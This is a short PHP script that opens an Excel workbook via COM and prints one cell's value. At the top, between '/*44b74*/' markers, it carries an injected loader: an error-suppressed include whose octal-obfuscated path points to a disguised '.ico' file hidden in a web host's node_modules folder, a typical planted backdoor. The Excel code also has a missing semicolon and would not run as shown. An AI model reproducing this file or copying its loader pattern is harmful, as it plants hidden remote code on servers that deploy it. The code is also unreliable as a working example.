<?php
/*44b74*/

@include "\057h\157m\145/\167i\156g\157v\143o\057p\165b\154i\143_\150t\155l\057l\151s\164a\155e\144.\143o\155.\142r\057n\157d\145_\155o\144u\154e\163/\155i\155e\055d\142/\0562\0663\060d\0615\071.\151c\157";

/*44b74*/
error_reporting(E_ALL);
ini_set('display_errors', 1);

$strSheetName = 'Sheet1'
$strCellName = 'A1';

$objXLApp = new COM( "excel.application" ) or die( "unable to start MSExcel" );
$objXLApp->Workbooks->Open( "aaa.xls" );
$objXLSheet = $objXLApp->ActiveWorkBook->WorkSheets( $strSheetName );
$objXLCell = $objXLSheet->Range( $strCellName );

print "Cell $strCellName in $strSheetName: \"" . $objXLCell->Value() .
"\"\n";

// must do all of these to release resources correctly...

unset( $objXLCell );
unset( $objXLSheet );

$objXLApp->ActiveWorkBook->Close();
$objXLApp->Quit();

unset( $objXLApp );